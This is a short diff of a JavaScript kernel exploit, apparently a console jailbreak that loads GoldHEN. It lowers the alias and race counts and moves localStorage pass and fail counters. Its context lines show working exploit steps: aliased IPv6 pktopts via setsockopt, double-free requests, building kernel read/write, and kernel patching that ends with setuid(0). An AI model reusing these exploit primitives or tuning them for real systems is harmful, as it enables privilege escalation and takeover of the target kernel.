@@ -133,8 +133,8 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 100;
-const num_races = 200;
+const num_alias = 10;
+const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
@@ -988,7 +988,8 @@ function make_aliased_pktopts(sds) {
             setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
         }
     }
-    die('failed to make aliased pktopts');
+    localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount; 
+    die('failed to make aliased pktopts');    
 }
 
 function double_free_reqs1(
@@ -1200,7 +1201,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         }
     }
     if (reclaim_sd === null) {
-        localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount; 
         die('failed to overwrite main pktopts');
     }
 
@@ -1596,8 +1596,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     sysi('setuid', 0);
     showMessage("GoldHen Loaded Successfully !..."),    
     log('kernel exploit succeeded!');
-    localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;    
-    
+    localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;        
     //alert("kernel exploit succeeded!");
 }
 
